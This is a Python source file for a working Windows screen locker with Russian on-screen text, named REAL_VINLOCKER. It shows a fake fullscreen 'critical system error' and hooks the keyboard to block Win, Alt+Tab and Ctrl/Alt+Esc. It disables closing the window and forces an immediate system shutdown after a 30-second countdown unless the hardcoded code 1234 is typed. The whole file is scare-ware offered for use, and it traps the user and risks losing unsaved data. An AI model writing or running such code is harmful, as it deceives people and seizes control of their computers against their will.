import tkinter as tk
from tkinter import font
import random
import math
import threading
import time
import os
import sys
import keyboard
import ctypes
import ctypes.wintypes
from ctypes import wintypes
import winreg

# Windows API константы для хука клавиатуры
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
WH_KEYBOARD_LL = 13
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_LMENU = 0xA4  
VK_RMENU = 0xA5

keyboard_hook = None

def LowLevelKeyboardProc(nCode, wParam, lParam):
    if nCode >= 0:
        struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_long)).contents
        vk_code = struct
        
        # Получаем состояние клавиш Alt
        alt_pressed = user32.GetAsyncKeyState(VK_LMENU) & 0x8000 or \
                      user32.GetAsyncKeyState(VK_RMENU) & 0x8000

        # Блокировка Win, Alt+Tab, Alt+Esc, Ctrl+Esc
        if vk_code in (VK_LWIN, VK_RWIN):
            return 1
        if vk_code == VK_TAB and alt_pressed:
            return 1
        if vk_code == VK_ESCAPE and (alt_pressed or (user32.GetAsyncKeyState(0x11) & 0x8000)):
            return 1
            
    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.HINSTANCE, wintypes.LPARAM)
pointer = CMPFUNC(LowLevelKeyboardProc)

def start_deep_block():
    global keyboard_hook
    keyboard_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)

def stop_deep_block():
    global keyboard_hook
    if keyboard_hook:
        user32.UnhookWindowsHookEx(keyboard_hook)
        keyboard_hook = None

class REAL_VINLOCKER:
    def __init__(self, root):
        self.root = root
        self.root.title("CRITICAL SYSTEM ERROR")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.resizable(False, False)
        
        # Захватываем все клавиши
        self.pressed = set()
        self.root.bind("<Key>", self.on_keydown)
        self.root.bind("<KeyRelease>", self.on_keyup)
        self.root.focus_set()
        
        self.attempts = 0
        self.input_text = ""
        self.code_pos = 0
        self.shake_active = False
        self.glitch_active = False
        self.unlocked = False 
        self.time_left = 30  # Время таймера
        
        # Запуск системы блокировки клавиш
        start_deep_block()
        
        self.setup_ui()
        self.start_effects()
        
    def setup_ui(self):
        self.canvas = tk.Canvas(self.root, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        system_font = font.Font(family="Consolas", size=14)
        title_font = font.Font(family="Consolas", size=48, weight="bold")
        
        self.title_id = self.canvas.create_text(960, 200, text="KРИТИЧЕСКАЯ", 
                                              font=title_font, fill="#00ff00", anchor="center")
        self.subtitle_id = self.canvas.create_text(960, 260, text="ОШИБКА СИСТЕМЫ", 
                                                 font=title_font, fill="#00ff44", anchor="center")
        
        self.matrix_overlay = self.canvas.create_text(960, 370, text="█▓▒░ SYSTEM CRITICAL ░▒▓█", 
                                                    font=("Courier New", 20), fill="#00ff00", 
                                                    anchor="center", tags="matrix")
        
        self.fake_code_label = self.canvas.create_text(960, 480, text="Введите код разблокировки:", 
                                                     font=system_font, fill="#00ff00", anchor="center")
        self.code_box = self.canvas.create_rectangle(750, 525, 1170, 575, 
                                                   outline="#00ff00", width=3, fill="#001100")
        self.code_display = self.canvas.create_text(960, 550, text="____", 
                                                  font=("Courier New", 36), fill="#00ff00", 
                                                  anchor="center")
        self.blinking_cursor = self.canvas.create_text(1140, 550, text="█", 
                                                     font=("Courier New", 36), fill="#00ff00")
        
        self.timer_text = self.canvas.create_text(960, 700, text="00:00:30", 
                                                font=("Digital-7", 96), fill="#00ff00", 
                                                anchor="center")
        
        warnings = [
            "⚠️  СИСТЕМА ЗАБЛОКИРОВАНА В ЦЕЛЯХ БЕЗОПАСНОСТИ ⚠️",
            "🛑 ВСЕ ПРОЦЕССЫ ОСТАНОВЛЕНЫ 🛑", 
            "🚨 ТАЙМЕР АКТИВИРОВАН. ВВЕДИТЕ КОД ДЛЯ ОТМЕНЫ 🚨",
            "💀 ПРИ ИСТЕЧЕНИИ ВРЕМНИ СИСТЕМА БУДЕТ ВЫКЛЮЧЕНА 💀",
            "🔥 СОХРАНЕНИЕ ДАННЫХ НЕВОЗМОЖНО 🔥"
        ]
        
        self.warning_texts = []
        for i, warning in enumerate(warnings):
            txt = self.canvas.create_text(960, 900 + i*60, text=warning, 
                                        font=("Consolas", 22, "bold"), fill="#ff0000", 
                                        anchor="center", tags="warning")
            self.warning_texts.append(txt)
        
        self.status_text = self.canvas.create_text(960, 1055, text="СТАТУС: ОЖИДАНИЕ ВВОДА | ЗАЩИТА АКТИВНА", 
                                                 font=("Consolas", 16, "bold"), fill="#00ff66", anchor="center")
        
        self.log_text = self.canvas.create_text(255, 1015, text="ИНИЦИАЛИЗАЦИЯ...", 
                                              font=("Courier New", 12), fill="#00ff00", 
                                              anchor="w", tags="log")
    
    def start_effects(self):
        self.countdown_thread = threading.Thread(target=self.countdown_effect, daemon=True)
        self.countdown_thread.start()
        
        self.glitch_thread = threading.Thread(target=self.glitch_effect, daemon=True) 
        self.glitch_thread.start()
        
        self.warning_thread = threading.Thread(target=self.warning_cycle, daemon=True)
        self.warning_thread.start()
        
        self.log_thread = threading.Thread(target=self.log_scrolling, daemon=True)
        self.log_thread.start()
        
        self.shake_thread = threading.Thread(target=self.shake_loop, daemon=True)
        self.shake_thread.start()
        
        self.blink_thread = threading.Thread(target=self.blink_cursor, daemon=True)
        self.blink_thread.start()

    def lock_system(self):
        """Улучшенный метод завершения работы системы"""
        if sys.platform == "win32":
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")

    def countdown_effect(self):
        """Улучшенный обратный отсчет с более надежным выключением"""
        start_time = time.time()
        while not self.unlocked:
            elapsed = int(time.time() - start_time)
            remaining = max(0, 30 - elapsed)
            self.time_left = remaining
            
            mins, secs = divmod(remaining, 60)
            timer_str = f"{mins:02d}:{secs:02d}"
            
            self.canvas.itemconfig(self.timer_text, text=timer_str)
            
            if remaining < 10:
                self.canvas.itemconfig(self.timer_text, fill="#ff0000")
                self.shake_active = True
            elif remaining < 20:
                self.canvas.itemconfig(self.timer_text, fill="#ff6600")
            
            if remaining <= 0:
                self.canvas.itemconfig(self.status_text, text="ВРЕМЯ ИСТЕКЛО. ВЫКЛЮЧЕНИЕ СИСТЕМЫ...")
                self.canvas.itemconfig(self.timer_text, text="SHUTDOWN")
                self.root.update()
                time.sleep(1)
                self.lock_system()
                break
                
            time.sleep(0.5)

    def shake_effect(self):
        if not self.shake_active: return
        sx, sy = random.randint(-10, 10), random.randint(-10, 10)
        self.canvas.move("all", sx, sy)
        self.root.after(50, lambda: self.canvas.move("all", -sx, -sy))
    
    def shake_loop(self):
        while not self.unlocked:
            if self.shake_active: self.root.after(0, self.shake_effect)
            time.sleep(0.1)

    def glitch_effect(self):
        while not self.unlocked:
            gx = random.randint(0, 1920)
            gh = random.randint(100, 500)
            line = self.canvas.create_line(gx, 0, gx, gh, fill=random.choice(["#00ff00", "#ff0000"]), width=2)
            self.root.after(100, lambda i=line: self.canvas.delete(i))
            time.sleep(0.2)

    def warning_cycle(self):
        while not self.unlocked:
            self.canvas.itemconfig(self.status_text, fill=random.choice(["#ff0000", "#00ff00"]))
            time.sleep(0.5)

    def log_scrolling(self):
        logs = ["BOOT_FAIL", "SYS_LOCK", "TIMER_ACTIVE", "WAIT_KEY_1234"]
        while not self.unlocked:
            self.canvas.itemconfig(self.log_text, text=f"LOG: {random.choice(logs)}")
            time.sleep(1)

    def blink_cursor(self):
        while not self.unlocked:
            self.canvas.itemconfig(self.blinking_cursor, fill="#00ff00")
            time.sleep(0.4)
            self.canvas.itemconfig(self.blinking_cursor, fill="black")
            time.sleep(0.4)

    def on_keydown(self, e):
        if self.unlocked: return "break"
        if e.keysym.isdigit():
            if len(self.input_text) < 4:
                self.input_text += e.keysym
                self.show_code_input()
        elif e.keysym == "Return":
            self.check_code()
        elif e.keysym == "BackSpace":
            self.input_text = self.input_text[:-1]
            self.show_code_input()
        return "break"

    def on_keyup(self, e): pass

    def show_code_input(self):
        display = self.input_text + "_" * (4 - len(self.input_text))
        self.canvas.itemconfig(self.code_display, text=display)

    def check_code(self):
        if self.input_text == "1234":
            self.unlocked = True
            self.canvas.itemconfig(self.title_id, text="ДОСТУП", fill="#00ff00")
            self.canvas.itemconfig(self.subtitle_id, text="РАЗРЕШЁН", fill="#00ff44")
            self.shake_active = False
            stop_deep_block()
            self.root.after(1500, self.root.destroy)
        else:
            self.input_text = ""
            self.show_code_input()
            self.canvas.configure(bg="#330000")
            self.root.after(100, lambda: self.canvas.configure(bg="black"))

if __name__ == "__main__":
    root = tk.Tk()
    app = REAL_VINLOCKER(root)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()